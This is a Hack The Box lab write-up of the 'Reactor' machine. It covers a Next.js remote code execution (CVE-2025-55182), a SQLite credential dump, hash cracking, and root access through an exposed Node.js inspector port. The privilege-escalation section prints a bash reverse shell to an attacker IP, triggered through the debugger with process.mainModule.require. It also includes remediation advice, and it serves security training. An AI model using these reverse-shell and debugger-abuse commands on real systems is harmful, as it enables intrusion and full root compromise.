# HTB Reactor Machine Writeup

<img width="700" height="400" alt="image" src="https://github.com/user-attachments/assets/a3964029-e473-4e5e-84f9-a76aa1f9a6b6" />


## Machine Information

| Field | Details |
|---|---|
| Platform | Hack The Box |
| Target IP | 10.129.102.102 |
| Difficulty | Easy |
| Operating System | Linux |
| Attack Vector | Next.js RCE (CVE-2025-55182) + Node.js Debugger Abuse |

## Executive Summary

This writeup documents the exploitation of the HTB Reactor machine, which featured a Next.js application vulnerable to CVE-2025-55182, a critical prototype pollution and unsafe deserialization vulnerability known as "React2Shell". The attack path involved identifying the vulnerable framework version, achieving remote code execution through a malicious `Next-Action` header payload, extracting and cracking credentials from a SQLite database, and escalating privileges by exploiting an exposed Node.js V8 Inspector debug port running as root.

## Reconnaissance

### Port Scanning

```bash
sudo nmap -sS -Pn -n -p- --min-rate 5000 10.129.102.102 -oN nmap/initial-scan.txt
```

![Port Scan Results](images/Pasted%20image%2020260906004200.png)

**Open Ports Discovered**:
- Port 22 (SSH)
- Port 3000 (HTTP - Web Service)

## Enumeration

### Technology Fingerprinting

Initial fingerprinting with WhatWeb confirmed the technology stack and application details:

```bash
whatweb 10.129.102.102:3000
```

**Output**:
````

[http://10.129.1.198:3000](http://10.129.1.198:3000) [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.129.1.198],  
Script, Title[ReactorWatch | Core Monitoring System],  
UncommonHeaders[x-nextjs-cache,x-nextjs-prerender,x-nextjs-stale-time],  
X-Powered-By[Next.js]

````

![Technology Fingerprinting](images/Pasted%20image%2020260906020445.png)

**Discovery**: The application is **ReactorWatch**, described as a Nuclear Reactor Core Monitoring Dashboard, running on **Next.js 15.0.3**.

### Web Application Analysis

Browsing to the application revealed a fully unauthenticated monitoring dashboard exposing live reactor telemetry and on-site personnel information.

**Core Status Panel**:

| Panel | Details |
|---|---|
| Core Status | Reactor Power 98.2%, Criticality 1.0002 (WARNING) |
| Core Temp | 324°C |
| Pressure | 155 bar |
| Coolant Flow | 18.4 k m³/h (CAUTION) |
| Turbine Output | 1.21 GW |

**On-Site Personnel Disclosed**:

| Name | Role | Status |
|---|---|---|
| Dr. Elena Rodriguez | Lead Nuclear Engineer | ONLINE |
| Marcus Kim | Senior Technician | ONLINE |
| James Thompson | Safety Officer | OFFLINE |

**Security Observation**: The dashboard exposed sensitive operational data without any authentication mechanism, representing a significant information disclosure vulnerability independent of the eventual RCE finding.

### Directory Fuzzing

Standard directory fuzzing with available wordlists did not yield actionable results. However, the identified Next.js version prompted further vulnerability research.

## Vulnerability Research

### CVE-2025-55182 Analysis

Next.js version **15.0.3** was identified as affected by **CVE-2025-55182**, a critical prototype pollution and unsafe deserialization vulnerability in the React Server Components handler, commonly referred to as **React2Shell**.

**Vulnerability Details**: This flaw allows an unauthenticated attacker to inject a malicious payload via the `Next-Action` header to achieve Remote Code Execution.

**Public Exploit**: https://github.com/xalgord/React2Shell

## Exploitation

### CVE-2025-55182 RCE

The public Python exploit was used to confirm code execution against the target application:

![Exploit Execution](images/Pasted%20image%2020260906013508.png)

**Result**: Remote code execution confirmed on the target server.

## Post-Exploitation

### File System Enumeration

With code execution established, key files were identified within the application directory:

![File System Enumeration](images/Pasted%20image%2020260906021707.png)

**Key Files Identified**:

| File | Notes |
|---|---|
| `.env` | Application environment configuration |
| `reactor.db` | SQLite database — readable by `node` user |

## Database Credential Extraction

### SQLite Database Access

The SQLite database was opened and the `users` table was dumped:

```bash
sqlite3 /opt/reactor-app/reactor.db
```

```sql
.tables
SELECT * FROM users;
```

![Database Dump](images/Pasted%20image%2020260906021750.png)

**Discovery**: User credentials including a password hash for the `engineer` account were extracted.

## Password Cracking

### Hash Cracking with CrackStation

The `engineer` password hash was saved to a file and submitted to CrackStation for cracking:

![Hash Cracking](images/Pasted%20image%2020260906015017.png)

**Result**: The password `reactor1` was successfully recovered.

**Credential Recovered**: `engineer:reactor1`

## Initial Access

### SSH Authentication

The cracked credentials were used to authenticate over SSH:

```bash
ssh engineer@10.129.102.102
```

![SSH Access](images/Pasted%20image%2020260906015223.png)

**Result**: User flag retrieved from `/home/engineer/user.txt`.

## Privilege Escalation

### Internal Service Enumeration

Open ports were enumerated from the `engineer` session to identify internal services:

```bash
ss -tulnp
```

![Internal Port Enumeration](images/Pasted%20image%2020260906022141.png)

**Key Finding**:
````

tcp LISTEN 0 511 127.0.0.1:9229 0.0.0.0:*

````

Port **9229** — the standard Node.js V8 Inspector/debugger port — was listening on localhost only. This port is used by Node.js processes launched with `--inspect`, allowing remote code evaluation via the Chrome DevTools Protocol.

### Identifying the Privileged Process

The `/opt/uptime-monitor/` directory contained a Node.js uptime monitoring worker:

```bash
cat /opt/uptime-monitor/worker.js
```

**Analysis**: This script runs as a persistent service probing the ReactorWatch application every 30 seconds. Process inspection confirmed it was running as **root**, exposing the debug port on `127.0.0.1:9229`.

### SSH Port Forwarding

Since the debug port was bound to localhost, an SSH tunnel was created to expose it to the attacker machine:

```bash
ssh -L 9229:127.0.0.1:9229 engineer@10.129.102.102
```

![SSH Port Forwarding](images/Pasted%20image%2020260906022212.png)

### Attaching to the Node.js Debugger

The Node.js built-in inspector client was used to connect to the forwarded port:

```bash
node inspect 127.0.0.1:9229
```

**Output**:
````

connecting to 127.0.0.1:9229 ... ok  
debug>

````

### Code Execution as Root

Direct use of `require` failed in the debug context. Using `process.mainModule.require` to access the module system succeeded:

```javascript
exec("process.mainModule.require('child_process').execSync('id').toString()")
```

**Output**:
````

'uid=0(root) gid=0(root) groups=0(root)\n'

````

![Debugger RCE as Root](images/Pasted%20image%2020260906022346.png)

**Confirmation**: The worker process was confirmed to be running as **root**.

### Reverse Shell Establishment

A reverse shell was triggered from the debug console:

```javascript
exec("process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.15.180/9002 0>&1\"').toString()")
```

**Listener on Attacker Machine**:
```bash
rlwrap nc -lnvp 9002
```

**Result — Root Shell Obtained**:

```
connect to [10.10.14.130] from (UNKNOWN) [10.129.1.198]  
root@reactor:~#

```

**Result**: Root flag retrieved from `/root/root.txt`.

## Technical Analysis

### Vulnerability Chain

1. **Technology Fingerprinting** → Next.js 15.0.3 version identification
2. **CVE Research** → CVE-2025-55182 (React2Shell) discovery
3. **Unauthenticated RCE** → Malicious `Next-Action` header exploitation
4. **File System Access** → Database and configuration file discovery
5. **Database Enumeration** → User credential hash extraction
6. **Hash Cracking** → Plaintext password recovery via CrackStation
7. **SSH Authentication** → Initial foothold as `engineer`
8. **Debug Port Discovery** → Node.js Inspector exposed on localhost
9. **SSH Tunneling** → Port forwarding to access debug interface
10. **Debugger RCE** → Root-level code execution via V8 Inspector

### Key Vulnerabilities

- **CVE-2025-55182**: Unauthenticated prototype pollution leading to RCE in Next.js Server Components
- **Information Disclosure**: Unauthenticated dashboard exposing sensitive operational data
- **Weak Password**: Crackable hash for the `engineer` account
- **Exposed Debug Port**: Node.js V8 Inspector running without authentication on a root-owned process
- **Insecure Development Practice**: Debug port left active in a production-like environment

## Remediation Recommendations

### Immediate Actions

1. **Update Next.js**: Upgrade to a patched version addressing CVE-2025-55182
2. **Implement Authentication**: Add authentication controls to the ReactorWatch dashboard
3. **Remove Debug Port**: Disable the `--inspect` flag on production Node.js processes
4. **Password Policy**: Enforce strong, unique passwords for all system accounts

### Long-term Security Improvements

1. **Principle of Least Privilege**: Avoid running monitoring services as root
2. **Network Segmentation**: Restrict access to internal service ports even on localhost
3. **Patch Management**: Implement regular dependency scanning and timely updates for Node.js frameworks
4. **Credential Storage**: Use strong hashing algorithms (bcrypt, argon2) with adequate work factors
5. **Security Monitoring**: Deploy logging and alerting for unusual debugger connections and SSH tunneling activity

## Key Lessons

1. **Framework Vulnerabilities**: Modern JavaScript frameworks like Next.js can harbor critical unauthenticated RCE vulnerabilities
2. **Debug Interfaces in Production**: Development tools such as the Node.js Inspector must never be exposed, even on localhost, when the associated process runs with elevated privileges
3. **Credential Hygiene**: Weak passwords remain a common pivot point even after initial compromise
4. **Defense in Depth**: Multiple independent weaknesses — unauthenticated dashboard, RCE vulnerability, weak passwords, and exposed debugger — combined to enable full system compromise
5. **Root Process Hygiene**: Services should run with the minimum privileges required for their function

## Conclusion

The HTB Reactor machine demonstrated a realistic attack scenario built around a critical, recently disclosed Next.js vulnerability (CVE-2025-55182). The attack path showcased the complete exploitation lifecycle from unauthenticated remote code execution through credential harvesting and privilege escalation via an exposed Node.js debugging interface running with root privileges. This exercise reinforced the importance of promptly patching web framework vulnerabilities, enforcing strong authentication on monitoring interfaces, and eliminating debug tooling from any process running with elevated system privileges.
